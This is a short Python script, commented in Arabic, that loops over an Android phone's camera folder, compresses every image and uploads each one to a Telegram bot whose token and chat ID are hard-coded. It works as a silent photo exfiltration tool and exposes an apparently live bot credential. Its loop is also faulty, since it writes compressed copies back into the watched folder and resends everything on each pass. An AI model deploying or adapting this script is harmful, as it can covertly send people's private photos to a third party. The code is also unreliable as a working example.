import os
import requests
import time
from PIL import Image

# ضع رمز الـ API الخاص بالبوت هنا
BOT_TOKEN = '7357005563:AAG3L6jGGzQ5FbumqOQJT8IX6H-94mweO94'
CHAT_ID = '5728592154'  # معرف الدردشة الخاص بك

# تحديد المجلد الذي يحتوي على الصور (مثل مجلد الكاميرا)
IMAGE_FOLDER = '/storage/emulated/0/DCIM/Camera'  # استبدل هذا بمسار مجلد الكاميرا الخاص بك

def compress_image(image_path):
    """ضغط الصورة وتخزينها في مكان مؤقت."""
    compressed_image_path = image_path.replace('.', '_compressed.')
    with Image.open(image_path) as img:
        img.save(compressed_image_path, format='JPEG', quality=50)  # ضغط الصورة إلى 50% من الجودة الأصلية
    return compressed_image_path

def send_photo(image_path):
    """إرسال الصورة إلى بوت تيليجرام."""
    try:
        with open(image_path, 'rb') as photo:
            response = requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', 
                                     data={'chat_id': CHAT_ID}, 
                                     files={'photo': photo})
        if response.status_code == 200:
            print(f'تم إرسال الصورة: {image_path}')
        else:
            print(f'فشل في إرسال الصورة: {image_path}. حالة الاستجابة: {response.status_code}')
    except Exception as e:
        print(f'حدث خطأ أثناء إرسال الصورة: {e}')

def main():
    """الوظيفة الرئيسية لإرسال الصور بشكل تلقائي."""
    while True:
        # استعراض الصور في المجلد
        images = [img for img in os.listdir(IMAGE_FOLDER) if img.endswith(('jpg', 'jpeg', 'png'))]
        
        for image in images:
            image_path = os.path.join(IMAGE_FOLDER, image)
            compressed_image_path = compress_image(image_path)  # ضغط الصورة
            
            send_photo(compressed_image_path)  # إرسال الصورة
            time.sleep(2)  # الانتظار لمدة 2 ثانية بين كل إرسال

        # الانتظار لمدة 10 ثوانٍ قبل البحث عن صور جديدة
        time.sleep(10)

if __name__ == '__main__':
    main()
